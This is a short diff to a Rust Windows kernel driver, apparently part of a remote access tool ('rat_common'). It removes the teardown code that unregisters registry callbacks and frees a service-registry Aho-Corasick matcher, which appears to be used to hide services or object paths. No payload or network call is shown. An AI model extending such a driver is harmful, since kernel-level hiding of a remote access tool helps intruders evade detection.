@@ -5,15 +5,14 @@ use core::{mem, ptr};
 use rat_common::windows::kernel::KernelHandoff;
 use wdk::{self, nt_success};
 use wdk_sys::ntddk::{
-    CmUnRegisterCallback, IoDeleteDevice, IoDeleteSymbolicLink, ObUnRegisterCallbacks,
-    PsCreateSystemThread, RtlInitUnicodeString,
+    IoDeleteDevice, IoDeleteSymbolicLink, ObUnRegisterCallbacks, PsCreateSystemThread,
+    RtlInitUnicodeString,
 };
-use wdk_sys::{LARGE_INTEGER, NTSTATUS, PDRIVER_OBJECT, THREAD_ALL_ACCESS, UNICODE_STRING};
+use wdk_sys::{NTSTATUS, PDRIVER_OBJECT, THREAD_ALL_ACCESS, UNICODE_STRING};
 use widestring::Utf16Str;
 
 use crate::global::{
-    CM_REGISTER_CALLBACK_COOKIE, DOS_NAME, OB_REGISTER_CALLBACKS_HANDLE, OBJ_PATH_AHO_CORASICK,
-    ORIGINAL_DRIVER_OBJECT, SERVICE_REGISTRY_AHO_CORASICK,
+    DOS_NAME, OB_REGISTER_CALLBACKS_HANDLE, OBJ_PATH_AHO_CORASICK, ORIGINAL_DRIVER_OBJECT,
 };
 use crate::{info, threads, warn};
 
@@ -36,23 +35,6 @@ fn remove_registered_services(driver: PDRIVER_OBJECT) {
             }
 
             IoDeleteDevice(device);
-        }
-    }
-
-    let cookie = CM_REGISTER_CALLBACK_COOKIE.swap(0, Ordering::AcqRel);
-    if cookie != 0 {
-        info!("Unregistering registry callbacks");
-        let status = unsafe { CmUnRegisterCallback(LARGE_INTEGER { QuadPart: cookie }) };
-        if !nt_success(status) {
-            warn!("CmUnRegisterCallback error: 0x{status:X}");
-        }
-    }
-
-    let ac = SERVICE_REGISTRY_AHO_CORASICK.swap(ptr::null_mut(), Ordering::AcqRel);
-    if !ac.is_null() {
-        info!("Dropping Aho-Corasick automaton");
-        unsafe {
-            let _ = Box::from_raw(ac);
         }
     }
 
